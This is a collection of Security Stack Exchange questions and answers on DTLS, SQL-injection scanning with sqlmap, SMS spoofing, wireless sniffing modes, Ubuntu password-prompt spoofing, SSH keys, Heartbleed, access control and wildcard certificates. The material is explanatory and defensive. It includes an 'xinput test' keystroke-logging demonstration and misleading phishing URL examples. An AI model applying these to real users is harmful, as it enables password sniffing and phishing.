"What changed between TLS and DTLS","27773","","<p>What did the <a href=""http://en.wikipedia.org/wiki/Datagram_Transport_Layer_Security"">DTLS</a> (TLS over UDP) authors have to change so that it could run without TCP?</p>

<p>Bonus points:
Do any of the protocol difference affect the way it should be used, both in terms of interface but also best-practices?</p>
","<p>DTLS is currently (version 1.2) defined in <a href=""http://tools.ietf.org/html/rfc6347"">RFC 6347</a> by explaining the differences with TLS 1.2 (<a href=""http://tools.ietf.org/html/rfc5246"">RFC 5246</a>). Most of the TLS elements are reused with only the smallest differences.</p>

<p>The context is that the client and the server want to send each other a lot of data as ""datagrams""; they <em>really</em> both want to send a long sequence of bytes, with a defined order, but do not enjoy the luxury of <a href=""http://en.wikipedia.org/wiki/Transmission_Control_Protocol"">TCP</a>. TCP provides a reliable bidirectional tunnel for bytes, where all bytes eventually reach the receiver in the same order as what the sender used; TCP achieves that through a complex assembly of acknowledge messages, transmission timeouts, and reemissions. This allows TLS to simply <em>assume</em> that the data will go unscathed under normal conditions; in other words, TLS deems it sufficient to <em>detect</em> alterations, since such alterations will occur only when under attack.</p>

<p>On the other hand, DTLS works over datagrams which can be lost, duplicated, or received in the wrong order. To cope with that, DTLS uses some extra mechanisms and some extra leniency.</p>

<p>Main differences are:</p>

<ol>
<li><p><strong>Explicit records</strong>. With TLS, you have <em>one</em> long stream of bytes, which the TLS implementation decides to split into records as it sees fit; this split is transparent for applications. Not so with DTLS: each DTLS record maps to a datagram. Data is received and sent on a record basis, and a record is either received completely or not at all. Also, applications must handle path MTU discovery themselves.</p></li>
<li><p><strong>Explicit sequence numbers</strong>. TLS records include a <a href=""http://en.wikipedia.org/wiki/Message_authentication_code"">MAC</a> which guarantees the record integrity, and the MAC input includes a record sequence number which thus verifies that no record has been lost, duplicated or reordered. In TLS, this sequence number (a 64-bit integer) is implicit (this is always one more than the previous record). In DTLS, the sequence number is explicit in each record (so that's an extra 8-byte overhead per record -- not a big deal). The sequence number is furthermore split into a 16-bit ""epoch"" and a 48-bit subsequence number, to better handle cipher suite renegotiations.</p></li>
<li><p><strong>Alterations are tolerated</strong>. Datagrams may be lost, duplicated, reordered, or even modified. This is a ""fact of life"" which TLS would abhor, but DTLS accepts. Thus, both client and server are supposed to tolerate a bit of abuse; they use a ""window"" mechanism to make sense of records which are ""a bit early"" (if they receive records in order 1 2 5 3 4 6, the window will keep the record ""5"" in a buffer until records 3 and 4 are received, or the receiver decides that records 3 and 4 have been lost and should be skipped). Duplicates MAY be warned upon, as well as records for which the MAC does not match; but, in general, anomalous records (missing, duplicated, too early beyond window scope, too old, modified...) are simply dropped.</p>

<p>This means that DTLS implementation do not (and, really, cannot) distinguish between normal ""noise"" (random errors which can occur) and an active attack. They can use some threshold (if there are too many errors, warn the user).</p></li>
<li><p><strong>Stateless encryption</strong>. Since records may be lost, encryption must not use a state which is modified with each record. In practice, this means no RC4.</p></li>
<li><p><strong>No verified termination</strong>. DTLS has no notion of a verified end-of-connection like what TLS does with the <code>close_notify</code> alert message. This means that when a receiver ceases to receive datagrams from the peer, it cannot know whether the sender has voluntarily ceased to send, or whether the rest of the data was lost. Note that such a thing was considered one of the capital sins of SSL 2.0, but for DTLS, this appears to be OK. It is up to whatever data format which is transmitted <em>within</em> DTLS to provision for explicit termination, if such a thing is needed.</p></li>
<li><p><strong>Fragmentation and reemission</strong>. Handshake messages may exceed the natural datagram length, and thus may be split over several records. The syntax of handshake messages is extended to manage these fragments. Fragment handling requires buffers, therefore DTLS implementations are likely to require a bit more RAM than TLS implementations (that is, implementations which are optimized for embedded systems where RAM is scarce; TLS implementations for desktop and servers just allocate big enough buffers and DTLS will be no worse for them). Reemission is done through a state machine, which is a bit more complex to implement than the straightforward TLS handshake (but the RFC describes it well).</p></li>
<li><p><strong>Protection against DoS/spoof</strong>. Since a datagram can be sent ""as is"", it is subject to IP spoofing: an evildoer can send a datagram with a fake source address. In particular a <code>ClientHello</code> message. If the DTLS server allocates resources when it receives a <code>ClientHello</code>, then there is ample room for <a href=""http://en.wikipedia.org/wiki/Denial-of-service_attack"">DoS</a>. In the case of TLS, a <code>ClientHello</code> occurs only after the three-way handshake of TCP is completed, which implies that the client uses a source IP address that it can actually receive. Being able to DoS a server without showing your real IP is a powerful weapon; hence DTLS includes an optional defense.</p>

<p>The defensive mechanism in DTLS is a ""cookie"": the client sends its <code>ClientHello</code>, to which the server responds with an <code>HelloVerifyRequest</code> message which contains an opaque cookie, which the client must send back as a <em>second</em> <code>ClientHello</code>. The server should arrange for a type of cookie which can be verified without storing state; i.e. a cookie with a time stamp and a MAC (strangely enough, the RFC <em>alludes</em> to such a mechanism but does not fully specify it -- chances are that some implementations will get it wrong).</p>

<p>This cookie mechanism is really an emulation of the TCP three-way handshake. It implies one extra roundtrip, i.e. brings DTLS back to TLS-over-TCP performance for the initial handshake.</p></li>
</ol>

<p>Apart from that, DTLS is similar to TLS. Non-RC4 cipher suites of TLS apply to DTLS. DTLS 1.2 is protected against BEAST-like attacks since, like TLS 1.2, it includes per-record random IV when using CBC encryption.</p>

<p>To sum up, DTLS extra features are conceptually imports from TCP (receive window, reassembly with sequence numbers, reemissions, connection cookie...) thrown over a normal TLS (the one important omission is the lack of acknowledge messages). The protocol is more lenient with regards to alterations, and does not include a verified ""end-of-transmission"" (but DTLS is supposed to be employed in contexts where this would not really make sense anyway).</p>

<p>The domain of application of DTLS is really distinct from that of TLS; it is meant to be applied to data streaming applications where losses are less important than latency, e.g. VoIP or live video feeds. For a given application, either TLS makes much more sense than DTLS, or the opposite; best practice is to choose the <em>appropriate</em> protocol.</p>
","29179"
"Are there any tools for scanning for SQL injection vulnerabilities while logged in?","27753","","<p>Some pages of my website were vulnerable to SQL injection. The injection worked only when the user was logged in. I have now fixed this problem, and now I want to make sure that no similar problems remain. I have tried scanning with <a href=""http://sqlninja.sourceforge.net"" rel=""nofollow"">sqlninja</a> and <a href=""http://sqlmap.org/"" rel=""nofollow"">sqlmap</a> but neither program has a provision to give website login details. Are there any tools that can scan for injection vulnerabilities with a logged in session?</p>
","<p>There is a cookie option in sqlmap :</p>

<blockquote>
  <p>--cookie=COOKIE     HTTP Cookie header</p>
</blockquote>

<p>So you just need to paste your cookie and you will be able to use sqlmap as if you were logged.</p>

<p>If you need the list of all the options : <a href=""https://github.com/sqlmapproject/sqlmap/wiki/Usage"">https://github.com/sqlmapproject/sqlmap/wiki/Usage</a></p>
","39845"
"How can SMS spoofing be detected?","27749","","<p><a href=""http://en.wikipedia.org/wiki/SMS_spoofing"">SMS spoofing</a> involves faking the source ID, by replacing it with alphanumeric text. This can be useful for mobile providers, but can lead to security issues such as social engineering. How can we as users, or the providers themselves, detect illegitimate SMS spoofing?</p>
","<p>The best way to detect if the message was spoof or not is to check the message-center. Normally, a spoofed source will have the message-center shows different gateway from the network of the gateway where the originating source is.</p>

<p>Ex.</p>

<p>Spoofed ID: VERIZON
Message-centre: +927566004455</p>

<p>Original ID: VERIZON
Message-centre: +181800001111</p>

<p>got it?</p>
","19963"
"What is the difference between Promiscuous and Monitor Mode in Wireless Networks?","27746","","<p>In Wireless Networks, you can put your wireless card in Promiscuous or in Monitor Mode.</p>

<p>What is the difference between these two modes ? </p>
","<ul>
<li><p><strong><a href=""https://en.wikipedia.org/wiki/Monitor_mode"">Monitor mode</a>:</strong> Sniffing the packets in the air without connecting (associating) with any access point.</p>

<p>Think of it like listening to people's conversations while you walk down the street.</p></li>
<li><p><strong><a href=""https://en.wikipedia.org/wiki/Promiscuous_mode"">Promiscuous mode</a>:</strong> Sniffing the packets after connecting to an access point. This is possible because the wireless-enabled devices send the data in the air but only ""mark"" them to be processed by the intended receiver. They cannot send the packets and make sure they only reach a specific device, unlike with switched LANs.</p>

<p>Think of it like joining a group of people in a conversation, but at the same time being able to hear when someone says ""Hey, Mike, I have a new laptop"". Even though you're not Mike, and that sentence was intended to be heard by Mike, but you're still able to hear it.</p></li>
</ul>
","37000"
"Isn't Ubuntu's system prompt for my password spoofable?","27711","","<p>Sometimes, Ubuntu shows the following window:</p>

<p><a href=""https://i.stack.imgur.com/VnQjq.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/VnQjq.png"" alt=""Screen shot of &quot;Authenticate&quot; dialog box asking for password""></a></p>

<p>This window can be caused by some background processes running, such as an automatic update, or a process which reports bugs to Canonical which manifests itself this way:</p>

<p><a href=""https://i.stack.imgur.com/yF0Ji.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/yF0Ji.png"" alt=""Screen shot of &quot;System program problem detected&quot; query box""></a></p>

<p>Since those are background processes, the first window is not shown in response to an action I performed myself, in a situation where I was expecting the system to ask me for the password. This means that:</p>

<ul>
<li><p>From the perspective of the user, there is no guarantee that the prompt comes from the operating system; it could be any malicious program which had only a limited permission to show a window, and which, by prompting for my password, will gain unlimited access to the entire machine.</p></li>
<li><p>By prompting the user for a password regularly, the system teaches the user that giving his system password whenever some application asks for it is a perfectly natural thing to do.</p></li>
</ul>

<p>My questions are:</p>

<ul>
<li><p>Is there any safety mechanism in Linux in general or Ubuntu specifically that prevents any application from displaying a dialog which looks identical to the system one, asking me for my password?</p></li>
<li><p>How should such windows be designed to increase the safety of the user? Why not implement a system similar to Windows' <kbd>Ctrl</kbd>+<kbd>Alt</kbd>+<kbd>Del</kbd> <a href=""https://security.stackexchange.com/q/34972/7684"">on logon</a>?</p></li>
</ul>
","<p>Your points are all good, and you are correct, but before we get outraged about it we need to remind ourselves how the linux security model works and what it's designed to protect.</p>

<p>Remember that the Linux security model is designed with a multi-user terminal-only or SSH server in mind. Windows is designed with an end-user workstation in mind (but I've heard that the recent generation of Windows is more terminal-friendly). In particular, Linux convention does a better job of sandboxing apps into users, while in Windows anything important runs as System, while the Linux GUI (X Server) sucks at security, and the Windows GUI has fancy things like UAC built-in. Basically, Linux is (and always has been) a server first and a workstation second, while Windows is the other way around.</p>

<hr>

<h2>Security Models</h2>

<p>As far as ""the OS"" (ie the kernel) is concerned, you have 7 tty consoles and any number of SSH connections (aka ""login sessions"") - it just so happens that ubuntu ships with scripts to auto-start the GUI on the <code>tty7</code> session, but to the kernel it's just another application.</p>

<p>Login sessions and user accounts are sandboxed quite nicely from each other, but Linux takes a security mindset that you don't need to protect a user from them-self. In this security model, if your account gets compromised by malware then it's a lost cause, but we still want to isolate it from other accounts to protect the system as a whole.</p>

<p>For example, Linux apps tend to create a low-privilege user like <code>apache</code> or <code>ftp</code> that they run as when not needing to do rooty things. If an attacker manages to take control of a running <code>apache</code> process, it can muck up other <code>apache</code> processes, but will have troubles jumping to <code>ftp</code> processes.</p>

<p>Note that Windows takes a fundamentally different approach here, largely through the convention that all important things run as System all the time.  A malicious service in Linux has less scope to do bad things than a malicious process running as System, so Windows <em>needs</em> to go to extra efforts to protect someone with admin rights from ""them-self"".</p>

<p>GUI environments and an X Server that was not designed for security throw a wrench into this security model.</p>

<hr>

<h2>Gnome gksudo vs Windows UAC, and keyloggers</h2>

<p>In Windows, when a user-process requests privilege escalation, the kernel throws up a special protected prompt whose memory and keyboard / mouse bus is isolated from the rest of the rest of the desktop environment. It can do this because the GUI is built-in to the OS. In Linux, the GUI (X server) is just another application, and therefore the password prompts belong to the process that invoked them, running as you, sharing memory permissions and an input bus with every other window and process running as you. </p>

<p>The root prompt can't do the fancy UAC things Iike lock the keyboard because those either need to be root already, or require totally re-designing the X server (see Wayland below). A catch-22 that in this case is a downside of separating the GUI from the kernel. But at least it's in keeping with the Linux security model.</p>

<p>If we were to revise the security model to clamp down on this by adding sandboxing between password prompts and other processes running as the user in the same GUI session, we could have to re-write a great many things. At the least, the kernel would need to become GUI aware such that it is capable of creating prompts (not true today). The other go-to example is that all processes in a GUI session share a keyboard bus. </p>

<p>Watch me write a keylogger and then press some keys <em>in a different window</em>:</p>

<pre><code>➜  ~ xinput list  
⎡ Virtual core pointer                      id=2    [master pointer (3)]
⎜   ↳ Virtual core XTEST pointer            id=4    [slave  pointer  (2)]
⎜   ↳ Logitech K400 Plus                    id=9    [slave  pointer  (2)]
⎜   ↳ ETPS/2 Elantech Touchpad              id=13   [slave  pointer  (2)]
➜  ~ xinput test 9
key release 36 
key press   44 
hkey release 44 
key press   40 
ekey release 40 
key press   33 
lkey release 33 
key press   33 
lkey press   39 
okey release 33 
key release 39 
key press   66 
key press   31
</code></pre>

<p>Any process running as you can sniff the password in another process's prompt or terminal and then call sudo on itself (this follows directly from the ""no need to protect you from you"" mindset), so increasing the security of the password prompts is useless unless we fundamentally change the security model and do a massive re-write of all sorts of things.</p>

<p><em>(it's worth noting that Gnome appears to at least sandbox the keyboard bus on the lock screen and new sessions through ""Switch Users"" as things typed there do not show up in my session's keyboard bus)</em></p>

<hr>

<h2>Wayland</h2>

<p>Wayland is a new protocol that aims to replace X11. It locks down client applications so that they cannot steal information or affect anything outside of their window. The only way the clients can communicate with each other outside of exterior IPC is by going through the compositor which controls all of them. This doesn't fix the underlying problem however, and simply shifts the need for trust to the compositor.</p>

<hr>

<h2>Virtualization and Containers</h2>

<p>If you work with cloud technologies, you're probably jumping up and down saying ""Docker is the answer!!"". Indeed, brownie points for you. While Docker itself is not really intended to enhance security (thanks @SvenSlootweg), it does point to using containerization and / or virtualization as a forward that's compatible with the current Linux architecture.</p>

<p>Two notable linux distributions that are built with inter-process isolation in mind:</p>

<p><strong>Qubes OS</strong> that runs user-level apps inside multiple VMs separated into ""security domains"" such as work, banking, web browsing.</p>

<p><strong>Android</strong> that installs and runs each app as a separate low-privilege user, thus gaining process-level isolation and file-system isolation (each app is confined to its own home directory) between apps.</p>

<hr>

<p><strong>Bottom Line:</strong> From the perspective of an end-user, it's not unreasonable to expect Linux to behave the same way as Windows, but this is one of those cases where you need to understand a bit about how the underlying system works and why it was designed that way. Simply changing the implementation of the password prompts will not accomplish anything so long as it is owned by a process owned by you. For Linux to get the same security behaviours as Windows in the context of a single-user GUI workstation would require significant re-design of the OS, so it's unlikely to happen, but things like Docker may provide a way forward in a more Linux-native way.</p>

<p>In this case, the important difference is that Linux is designed at the low level to be a multi-user server and they make the decision not to protect a user from them-self, while Windows is designed to be a single-user workstation, so you do need to have inter-process protections within a login session. It's also relevant that in Windows the GUI is part of the OS, while in Linux the GUI is just another user-level application.</p>
","167415"
"How to secure SSH such that multiple users can log in to one account?","27648","","<p>Consider a generic up-to-date Linux distro hosting a web server. I need three humans to occasionally SSH into the same user account to perform some action that can only be done by that particular user account.</p>

<p>The 'easy way' to do this would be to simply allow SSH by password and to give the username/password combo to all three humans. However, I prefer to disable password logins and to require RSA keys. Is there a way to configure SSH to accept the RSA keys from three different users? I don't want to distribute the same keys to those users as they do log into other servers as well.</p>
","<p>Yes, you can have multiple keys that are allowed to log into an account. This is a common configuration among users who have multiple trusted machines and keep a separate private key on each one.</p>

<p>This is also a reasonable configuration for a service account that is only meant to access one application. In this situation it is usually combined with a restricted or special-purpose login shell that only allows access to that specific application. For example, <a href=""https://github.com/res0nat0r/gitosis"">gitosis</a> is a gateway to the Git version control system, and handles user authentication by itself, sticking to a joint <code>git</code> account at the unix level. If multiple people can run arbitrary command through this account, you should really give them different unix accounts.</p>

<p>Get the users to send you a public key, and concatenate the public keys together to form the <code>~/.ssh/authorized_keys</code> file, or equivalently append each public key starting from an empty file.</p>

<p>You can put restrictions on the keys themselves in the <a href=""http://www.freebsd.org/cgi/man.cgi?query=sshd&amp;sektion=8#AUTHORIZED_KEYS_FILE_FORMAT""><code>authorized_keys</code> file</a>. For example, <code>ssh-rsa AAAA… alice@example.com</code> declares a key with no restrictions, whereas a user who logs in with the following key is only allowed to log in from a specific IP subnet, may not forward ports, and may only run a specific command:</p>

<pre><code>command=""/usr/local/bin/restricted-app"",from=""192.0.2.0/24"",no-agent-forwarding,no-port-forwarding,no-x11-forwarding ssh-rsa AAAA… bob@example.com
</code></pre>

<p>If you rely on command restrictions, be careful that the command doesn't allow any indirect way to obtain a shell or to edit files in the <code>.ssh</code> directory or any other sensitive location. You may make the account's home directory, the <code>~/.ssh</code> directory and its contents owned by root and accessible for reading by the user, which would prevent privilege escalation in case the restricted application has a file overwrite vulnerability but no shell escape vulnerability.</p>

<p>Set <code>LogLevel VERBOSE</code> (one step up from the default level <code>INFO</code>) in the server configuration (<code>sshd_config</code>) to log which key was used to log into the account each time.</p>
","34237"
"Does Heartbleed mean new certificates for every SSL server?","27643","","<p>If you haven't heard of the <a href=""http://heartbleed.com"">Heartbleed Bug</a>, it's something to take a look at immediately. It essentially means that an attacker can exploit a vulnerability in many versions of OpenSSL to be able to gain access to a server's <em>private key</em>. It is not a theoretical threat, it is a demonstrable and reproducible threat. See the above link for more information.</p>

<p>The question I think most organizations are asking themselves is the following:</p>

<p>Does every company now need to create new public/private keypairs and ask their CA to invalidate the original signed keypairs? </p>
","<p>It means <strong>much more</strong> than just new certificates (or rather, new key pairs) for every affected server. It also means:</p>

<ul>
<li>Patching affected systems to OpenSSL 1.0.1g</li>
<li>Revocation of the old keypairs that were just superseded</li>
<li>Changing all passwords</li>
<li>Invalidating all session keys and cookies</li>
<li>Evaluating the actual content handled by the vulnerable servers that could have been leaked, and reacting accordingly.</li>
<li>Evaluating any other information that could have been revealed, like memory addresses and security measures</li>
</ul>

<p>Summarized from <a href=""http://heartbleed.com/"">heartbleed.com</a> (emphasis mine):</p>

<blockquote>
  <p><strong>What is leaked primary key material and how to recover?</strong></p>
  
  <p>These are the crown jewels, <strong>the encryption keys themselves</strong>. Leaked
  secret keys allows the attacker to decrypt any past and future traffic
  to the protected services and to impersonate the service at will. Any
  protection given by the encryption and the signatures in the X.509
  certificates can be bypassed. Recovery from this leak requires
  patching the vulnerability, revocation of the compromised keys and
  reissuing and redistributing new keys. Even doing all this will still
  leave any traffic intercepted by the attacker in the past still
  vulnerable to decryption. All this has to be done by the owners of the
  services.</p>
  
  <p><strong>What is leaked secondary key material and how to recover?</strong></p>
  
  <p>These are for example <strong>the user credentials (user names and
  passwords)</strong> used in the vulnerable services. Recovery from this leaks
  requires owners of the service first to restore trust to the service
  according to steps described above. After this users can start
  changing their passwords and possible encryption keys according to the
  instructions from the owners of the services that have been
  compromised. All session keys and session cookies should be invalided
  and considered compromised.</p>
  
  <p><strong>What is leaked protected content and how to recover?</strong></p>
  
  <p>This is <strong>the actual content handled by the vulnerable services</strong>. It
  may be personal or financial details, private communication such as
  emails or instant messages, documents or anything seen worth
  protecting by encryption. Only owners of the services will be able to
  estimate the likelihood what has been leaked and they should notify
  their users accordingly. Most important thing is to restore trust to
  the primary and secondary key material as described above. Only this
  enables safe use of the compromised services in the future.</p>
  
  <p><strong>What is leaked collateral and how to recover?</strong></p>
  
  <p>Leaked collateral are <strong>other details that have been exposed</strong> to the
  attacker in the leaked memory content. These may contain technical
  details such as memory addresses and security measures such as
  canaries used to protect against overflow attacks. These have only
  contemporary value and will lose their value to the attacker when
  OpenSSL has been upgraded to a fixed version.</p>
</blockquote>
","55087"
"TLS Handshake gets torn down","27568","","<p>I am trying to debug a TLS handshake between two SIP trunk endpoints: .75 and .82. Mutual authentication is being used.</p>

<p>.75 sends:</p>

<blockquote>
  <ul>
  <li>Client Hello</li>
  <li>Certificate, Client Key Exchange</li>
  <li>Certificate Verify, Change Cipher Spec, Encrypted Handshake Message</li>
  <li>Encrypted Alert</li>
  </ul>
</blockquote>

<p>.82 sends:</p>

<blockquote>
  <ul>
  <li>Server Hello, Certificate, Certificate Request, Server Hello Done</li>
  <li>Change Cipher Spec, Encrypted Handshake Message</li>
  <li>[FIN, ACK]</li>
  </ul>
</blockquote>

<p>From the wireshark trace on .75, the details of the Encrypted Alert is:
<code>Content Type: Alert (21)</code></p>

<p>How do I know what causes the failure from 82?</p>
","<p>Your .75 machine (the client) sends an ""encrypted alert"" message. If it does that, then this machine, at that point, believes that the connection is still up and running, and the server will be able to receive the alert message, and in particular decrypt it. Otherwise, what would be the point of sending that message ? Therefore, it is <em>probable</em> that the FIN message from the server has been sent <em>after</em> receiving this alert. Quite possibly, the client sends an alert which triggers the connection closure, and the server reacts by closing the transport medium (the FIN packet).</p>

<p>Note that in a normal handshake, the server will wait for reception of the <code>Finished</code> message from the client (the ""encrypted handshake message"" after the <code>Change Cipher Spec</code>) before sending its own <code>Change Cipher Spec</code> and <code>Finished</code>. We see that here, so the server was able to process the <code>Finished</code> message from the client, including decryption, MAC verification and message contents.</p>

<p><strong>Assuming that both implementations conform to <a href=""http://tools.ietf.org/html/rfc5246"">the standard</a></strong>, the ""encrypted alert"" message is not a <code>close_notify</code> warning. A <code>close_notify</code> is an alert message which warns the recipient of the intention of the sender to gracefully terminate the connection. The recipient must then reply with a <code>close_notify</code> of its own, marking its acceptance of that fact. Here, the client sends an alert message but no alert message is sent in response by the server, so we might surmise that we are not witnessing a graceful termination with a pair of <code>close_notify</code>. Most plausibly, the client's alert is a <em>fatal</em> alert, which tells to the server that something is amiss, and that the connection is doomed. The server can then only close the transport medium because there is nothing else that it can do at that point.</p>

<p>There is no indication as to what bothered the client enough to make it send an alert; however, there are rather decisive indications that all cryptographic operations went well.</p>

<p>You may want to run two network captures on both systems, so that you may get precise timings for all packets; it helps in reconstructing the actual sequence of events.</p>
","39018"
"MAC vs DAC vs RBAC","27507","","<p>Someone can suggest me a real situation in which is better to use MAC (Mandatory Access Control) instead of DAC (Discretionary Access Control) or RBAC (Role Based Access Control)? And in which DAC is better than the others? And in which RBAC is the best?</p>

<p>I know the theoretical notions, and I know that RBAC is better in situation in which we want to assign the rights not to the people, but to the specific job. I know also that MAC and RBAC is better in situation where we want to avoid that an user can manage the rights.</p>
","<p><strong>DAC</strong> is the way to go to let people manage the content they own. It might sound obvious, but for instance DAC is very good to let users of an online social network choose who accesses their data. It allows people to revoke or forward privileges easily and immediately. <a href=""http://dl.acm.org/citation.cfm?id=1979245"" rel=""noreferrer"">Reactive access control</a>, <a href=""http://dl.acm.org/citation.cfm?id=1143138"" rel=""noreferrer"">Seeing further</a> and <a href=""https://research.microsoft.com/apps/pubs/default.aspx?id=81057"" rel=""noreferrer"">Laissez-faire file sharing</a> provide nice examples of research on DAC with users.</p>

<p><strong>RBAC</strong> is a form of access control which as you said is suitable to separate responsibilities in a system where multiple roles are fulfilled. This is obviously true in corporations (often along with compartmentalization e.g. <a href=""https://en.wikipedia.org/wiki/Brewer_and_Nash_model"" rel=""noreferrer"">Brewer and Nash</a> or <a href=""https://en.wikipedia.org/wiki/Multi_categories_security"" rel=""noreferrer"">MCS</a>) but can also be used on a single user operating system to implement the <a href=""https://en.wikipedia.org/wiki/Principle_of_least_privilege"" rel=""noreferrer"">principle of least privilege</a>. RBAC is designed for <a href=""http://en.wikipedia.org/wiki/Separation_of_duties"" rel=""noreferrer"">separation of duties</a> by letting users select the roles they need for a specific task. The key question is whether you use roles to represent tasks performed on your system and assign roles in a central authority (in which case RBAC is a form of MAC); or if you use roles to let users control permissions on their own objects (leading to multiple roles per object and absolutely no semantics in roles, even though it's <a href=""http://www.profsandhu.com/confrnc/rbac/r98dac%28org%29.pdf"" rel=""noreferrer"">theoretically possible</a>).</p>

<p><strong>MAC</strong> in itself is vague, there are many many ways to implement it for many systems. In practice, you'll often use a combination of different paradigms. For instance, a UNIX system mostly uses DAC but the root account bypasses DAC privileges. In a corporation, beyond separating your different departments and teams with MAC/RBAC you may allow some DAC for coworkers to share information on your corporate file system.</p>

<hr>

<p>It'd be better to make your question specific and tell what system(s) you want to protect, if any. What access control to use always depends on the specific situation and context you're considering.</p>
","63521"
"Is it ok to use computer while scanning for viruses?","27485","","<p>Should one refrain from using the computer while a virus scan is in progress? Are there certain things that are ok and others not? For example is it ok to use a web browser while a scan is in progress? </p>

<p>This may be entirly unrelated but Avast 7 says ""Multiple scans can be run at the same time"".</p>
","<p>Your AV might be unable to scan some files while they are in use. If that does happen, then any good AV should report this in a summary of the scan when it finishes, I'd have thought. </p>

<p>Performance could be pretty dire while it's running a scan, too!</p>
","16901"
"What vulnerabilities could be caused by a wildcard SSL cert?","27483","","<p>In a comment on <a href=""https://security.stackexchange.com/questions/45/what-is-the-best-option-for-setting-up-a-several-sites-supporting-ssl-on-the-sam/172#172"">this answer</a>, AviD says:</p>

<p>""There are numerous security issues with wildcard SSL certs.""</p>

<p>So, what are the problems? I understand that the same private key is being used in multiple contexts, but given that I could host all of my applications under the same host name I don't see this as a 'new' issue introduced by wildcard certificates.</p>
","<p>A ""wildcard certificate"" is a certificate which contains, as possible server name, a name which contains a ""<code>*</code>"" character. Details are in <a href=""http://tools.ietf.org/html/rfc2818#section-3.1"">RFC 2818, section 3.1</a>. The bottom-line: when the server certificate contains <code>*.example.com</code>, it will be accepted <strong>by clients</strong> as a valid certificate for any server whose <em>apparent name</em> matches that name.</p>

<p>In the certification business for Web sites, there are four main actors:</p>

<ul>
<li>The SSL server itself.</li>
<li>The vendor of the Web browser which the client will use.</li>
<li>The human user, who controls to some extent what the client browser will do.</li>
<li>The CA who issued the certificate to the server.</li>
</ul>

<p>Wildcard certificates don't imply extra vulnerabilities for the SSL server; indeed, the SSL server has no interest in looking at its own certificate. That certificate is for the benefits of clients, to convince them that the public key contained in the certificate is indeed the public key of the genuine SSL server. The SSL server <em>knows</em> its own public/private key pair and does not need to be convinced about it.</p>

<p>The human user has no idea what a public key is. What he sees is a padlock icon and, more importantly, the <strong>intended server name</strong>: that's the name at the right of ""<code>https://</code>"" and before the next ""<code>/</code>"". The Web browser is <em>supposed</em> to handle the technical details of verifying that the name is right, i.e. validation of the server certificate, and verification that the name matches that which is written in the said certificate. If the browser does not do this job, then it will be viewed as sloppy and not assuming its role, which can have serious commercial consequences, possibly even legal. Similarly, the CA is contractually bound to follow defined procedures for identifying SSL server owners so that fake certificates will be hard to obtain for attackers (contract is between the CA and its über-CA, recursively, up to the root CA which is itself bound by a pact with the OS or browser vendor, who accepted to include the root CA key in the OS or browser under defined conditions).</p>

<p>What this amounts to, is that the <em>browser</em> and the <em>CA</em> must, in practice, pamper the user through the verification process. They are more or less under obligation (by law or, even stricter, by business considerations) to prevent the user from being swindled through fake sites which look legit. The boundary between the user's job and the browser/CA job is not clearly defined, and has historically moved. In Days of Yore, I mean ten years ago or so, browsers just printed out the raw URL, and it was up to the human user to find the server name in it. This lead forged site operators (i.e. ""phishing sites"") to use URL which are technically valid, but misleading, like this one:</p>

<pre><code>https://www.paypal.com:payment-interface-login-session@xcvhjvb.com/confirm.html
</code></pre>

<p>Since human users are, well, <em>human</em>, and most of them read left-to-right (most rich and gullible scam targets are still in Western countries), they will begin on the left, see <code>www.paypal.com</code>, stop at the colon sign (""too technical""), and be scammed.</p>

<p>In reaction, browser vendors have acknowledged that the URL-parsing abilities of human users are not as good as was initially assumed, and thus recent browsers highlight the domain part. In the case above, this would be <code>xcvhjvb.com</code>, and certainly not anything with <code>paypal.com</code> in it. Now comes the part where <strong>wildcard certificates</strong> enter the game. If the owner of <code>xcvhjvb.com</code> buys a wildcard certificate containing ""<code>*.xcvhjvb.com</code>"", then he can setup a phishing site called:</p>

<pre><code>https://PayPal-payment-interface-login-session.xcvhjvb.com/confirm.html
</code></pre>

<p>which will be accepted by the browser (it matches the wildcard name), and is still likely to catch unwary users (and there are many...). This name <em>could</em> have been bought by the attacker without resorting to wildcards, but then the CA employees would have seen the name with obvious fraudulent attempt (good CA <em>do</em> a human validation of every request for certificates, or at least raise alerts for names which are very long and/or contain known bank names in them).</p>

<p>Therefore, <strong>wildcard certificates decrease the effectiveness of fraud-containment measures on the CA side</strong>. This is like a blank signature from the CA. If wildcard-based phishing attempts become more commonplace, one can expect that one or several of the following measures will come into existence:</p>

<ul>
<li>Browsers highlight only the parts of the domain name which matches <em>non-wildcard</em> elements in the certificate.</li>
<li>CA require heavier paperwork and contracts for wildcard certificates (and these will be more expensive).</li>
<li>Browsers deactivate support for wildcard certificates altogether.</li>
</ul>

<p>I actually expect all three measures to be applied within the next the years. I could be totally wrong about it (that's the problem with predicting the future) but this is still my gut feeling.</p>

<hr />

<p>Nitpickingly, we can also point out that wildcard certificates are useful for sharing the same key pair between different server <em>names</em>, which makes it more probable that the private key will be shared between different server <em>machines</em>. Traveling private keys are a security risk in their own right; the more a private key wanders around, the less ""private"" it remains.</p>
","32366"
"It is safe to store photos and documents on skydrive / google cloud services?","27426","","<p>I have over 20GB of photos and documents stored on my hard disk without a backup. I'm thinking about saving all of them in a cloud service such as Microsoft Skydrive or google cloud, but I'm wondering if it is really safe... I mean, can I trust these services in privacy and responsibility just as if I was saving these files on an external hard drive? </p>
","<p>The most sensible approach is to assume you cant rely on their privacy - it isn't their responsibility, although there are some services whose selling point is securing this data.</p>

<p>If you take that stance, as long as you encrypt all data before it goes to the cloud you can be safe (decide on what level of encryption you need in order to be safe)</p>

<p>This approach gives you a very practical backup, just make sure you protect your encryption keys.</p>
","14160"
"What are the implications of NSA surveillance on the average internet user?","27380","","<p>It would appear as though the tinfoil hat-wearing were vindicated today, as <a href=""http://www.washingtonpost.com/www.washingtonpost.com/investigations/us-intelligence-mining-data-from-nine-us-internet-companies-in-broad-secret-program/2013/06/06/3a0c0da8-cebf-11e2-8845-d970ccb04497_story.html"">news broke</a> of the true scale of the U.S. government's surveillance of its citizens' online activities, conducted primarily through the NSA and seemingly <a href=""https://www.eff.org/deeplinks/2013/06/confirmed-nsa-spying-millions-americans"">beyond the realm of the law</a>.</p>

<p>If the reports are to be believed, metadata about virtually every aspect of individuals' lives - phone records and geographic data, emails, web application login times and locations, credit card transactions - are being aggregated and subjected to 'big data' analysis. </p>

<p>The potential for abuse, especially in light of the recent IRS scandal and AP leak investigation, appears unlimited.</p>

<p><strong>Knowing this, what steps can ordinary individuals take to safeguard themselves against the collection, and exposure, of such sensitive personal information?</strong>    </p>

